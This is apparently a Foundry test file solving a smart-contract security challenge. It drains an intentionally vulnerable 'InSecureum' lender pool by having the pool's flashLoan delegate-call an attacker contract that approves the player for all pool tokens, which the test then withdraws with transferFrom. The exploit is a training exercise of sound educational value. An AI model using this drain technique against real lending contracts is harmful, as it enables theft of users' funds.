// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";


contract Challenge1Test is Test {
    InSecureumLenderPool target; 
    IERC20 token;

    address player = makeAddr("player");

    function setUp() public {

        token = IERC20(address(new InSecureumToken(10 ether)));
        
        target = new InSecureumLenderPool(address(token));
        token.transfer(address(target), 10 ether);
        
        vm.label(address(token), "InSecureumToken");
    }

    function testChallenge() public {        
        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/

        //=== this is a sample of flash loan usage
        HackerContract hackerContract = new HackerContract();

        /*  We're taking advantaje that the flashLoan makes a delegate call to the borrower
            So when making a flash Loan, the target is going to call our contract
            We encode the call to our function
            This function is going to make an approve, so the balance is not modified
        */ 
        target.flashLoan(
          address(hackerContract),
          abi.encodeWithSignature("Hack(address,address)", address(token), player)
        );

        // Finally we transfer all token to us
        token.transferFrom(address(target), player, token.balanceOf(address(target)));

        vm.stopPrank();

        assertEq(token.balanceOf(address(target)), 0, "contract must be empty");
    }
}


/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/
// @dev this is the solution
contract HackerContract {
    using Address for address;
    using SafeERC20 for IERC20;

    function Hack(address token, address player) public {
        IERC20(token).approve(player, IERC20(token).balanceOf(address(this)));
    }
}


// @dev this is a demo contract that is used to receive the flash loan
contract FlashLoandReceiverSample {
    IERC20 public token;
    function receiveFlashLoan(address _user /* other variables */) public {
        // check tokens before doing arbitrage or liquidation or whatever
        uint256 balanceBefore = token.balanceOf(address(this));

        // do something with the tokens and get profit!

        uint256 balanceAfter = token.balanceOf(address(this));

        uint256 profit = balanceAfter - balanceBefore;
        if (profit > 0) {
            token.transfer(_user, balanceAfter - balanceBefore);
        }
    }
}
